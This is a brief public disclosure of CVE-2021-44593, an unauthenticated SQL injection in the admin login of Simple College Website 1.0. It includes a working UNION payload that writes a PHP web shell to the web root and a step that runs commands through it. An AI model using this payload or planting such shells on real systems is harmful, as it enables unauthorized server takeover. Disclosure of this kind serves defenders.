# CVE-2021-44593
Public disclosure of CVE-2021-44593. A SQL injection/arbitrary file upload/remote code execution vulnerability in Simple College Website.

## DESCRIPTION

Simple College Website 1.0 is vulnerable to an unauthenticated union-based SQL injection in the "username" parameter of the /admin/login.php page, which can then be leveraged to upload arbitrary files & gain remote code execution.

## COMPONENTS AFFECTED

The function ```login()``` in ```admin_class.php```

## STEPS TO REPRODUCE

1. Access the admin login page (usually /admin/login.php) 
2. Submit the login form with the POST parameter "username" containing the following UNION-based SQL injection: 
```
' union select null, null, ("<?php system($_GET['cmd']);?>"), null, null INTO OUTFILE '/var/www/html/testing.php'; -- -
```
6. Navigate to /testing.php?cmd=id

## NOTES

1. Knowledge of the web server root directory location is needed.
2. Knowledge of the document root directory location may also be needed if it is not the same as the web server root directory.
3. Further, the MySQL daemon needs to have write permissions for said directory.

